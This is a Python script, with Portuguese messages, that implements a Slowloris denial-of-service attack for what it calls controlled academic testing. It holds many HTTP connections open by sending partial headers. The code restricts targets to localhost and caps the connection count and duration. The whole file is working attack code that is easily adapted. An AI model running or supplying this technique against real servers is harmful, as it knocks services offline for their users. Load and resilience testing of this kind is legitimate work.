#!/usr/bin/env python3

import argparse
import random
import socket
import sys
import time
from typing import List

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
MAX_SOCKETS = 200
MAX_DURATION = 120


def validate_args(args: argparse.Namespace) -> None:
    if args.host not in ALLOWED_HOSTS:
        print("Erro: esta versão é limitada a testes locais.")
        print("Use apenas: localhost, 127.0.0.1 ou ::1")
        sys.exit(1)

    if args.sockets > MAX_SOCKETS:
        print(f"Erro: limite máximo permitido é {MAX_SOCKETS} conexões.")
        sys.exit(1)

    if args.duration > MAX_DURATION:
        print(f"Erro: limite máximo permitido é {MAX_DURATION} segundos.")
        sys.exit(1)

    if not args.path.startswith("/"):
        args.path = "/" + args.path

    if "#" in args.path:
        args.path = args.path.split("#", 1)[0]


def create_socket(host: str, port: int, connect_timeout: int) -> socket.socket:
    family = socket.AF_INET6 if host == "::1" else socket.AF_INET

    sock = socket.socket(family, socket.SOCK_STREAM)
    sock.settimeout(connect_timeout)
    sock.connect((host, port))
    sock.settimeout(None)

    return sock


def send_initial_payload(
    sock: socket.socket,
    host: str,
    port: int,
    method: str,
    path: str,
    use_cache_buster: bool,
) -> None:
    cache = f"?{random.randint(1, 999999999)}" if use_cache_buster else ""

    payload = (
        f"{method} {path}{cache} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: Mozilla/5.0 (Slowloris Local Test)\r\n"
        "Accept-language: pt-BR,pt;q=0.9,en;q=0.8\r\n"
        "Content-Length: 42\r\n"
    )

    sock.sendall(payload.encode("utf-8"))


def build_socket(args: argparse.Namespace) -> socket.socket:
    sock = create_socket(args.host, args.port, args.connect_timeout)

    send_initial_payload(
        sock=sock,
        host=args.host,
        port=args.port,
        method=args.method,
        path=args.path,
        use_cache_buster=args.cache,
    )

    return sock


def close_sockets(sockets: List[socket.socket]) -> None:
    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass


def run(args: argparse.Namespace) -> None:
    validate_args(args)

    sockets: List[socket.socket] = []
    total_sent = 0
    total_failed = 0

    started_at = time.time()
    finished_at = started_at + args.duration

    print("Iniciando teste Slowloris local")
    print(f"Host: {args.host}")
    print(f"Porta: {args.port}")
    print(f"Caminho: {args.path}")
    print(f"Conexões alvo: {args.sockets}")
    print(f"Duração: {args.duration}s")
    print(f"Intervalo entre envios: {args.interval}s")
    print()

    try:
        while time.time() < finished_at:
            while len(sockets) < args.sockets:
                try:
                    sock = build_socket(args)
                    sockets.append(sock)
                    total_sent += 1
                except OSError:
                    total_failed += 1
                    break

            alive_sockets: List[socket.socket] = []

            for sock in sockets:
                try:
                    header = f"X-a: {random.randint(1, 999999)}\r\n"
                    sock.sendall(header.encode("utf-8"))
                    alive_sockets.append(sock)
                    total_sent += 1
                except OSError:
                    total_failed += 1
                    try:
                        sock.close()
                    except OSError:
                        pass

            sockets = alive_sockets

            elapsed = int(time.time() - started_at)
            remaining = max(0, int(finished_at - time.time()))

            print(
                f"[{elapsed}s] conexões ativas={len(sockets)} "
                f"envios={total_sent} falhas={total_failed} "
                f"restante={remaining}s"
            )

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\nTeste interrompido pelo usuário.")

    finally:
        close_sockets(sockets)
        print("\nTeste finalizado.")
        print(f"Total de envios: {total_sent}")
        print(f"Total de falhas: {total_failed}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Slowloris local em Python para testes acadêmicos controlados."
    )

    parser.add_argument("--host", default="localhost", help="Host local alvo.")
    parser.add_argument("--port", type=int, default=3000, help="Porta da API.")
    parser.add_argument("--path", default="/", help="Caminho da rota testada.")
    parser.add_argument("--sockets", type=int, default=100,
                        help="Quantidade de conexões.")
    parser.add_argument("--duration", type=int, default=60,
                        help="Duração do teste em segundos.")
    parser.add_argument("--interval", type=int, default=5,
                        help="Intervalo entre envios.")
    parser.add_argument("--connect-timeout", type=int,
                        default=5, help="Timeout da conexão TCP.")
    parser.add_argument("--method", default="GET",
                        choices=["GET", "POST"], help="Método HTTP.")
    parser.add_argument("--cache", action="store_true",
                        help="Adiciona parâmetro aleatório na URL.")

    return parser.parse_args()


if __name__ == "__main__":
    run(parse_args())
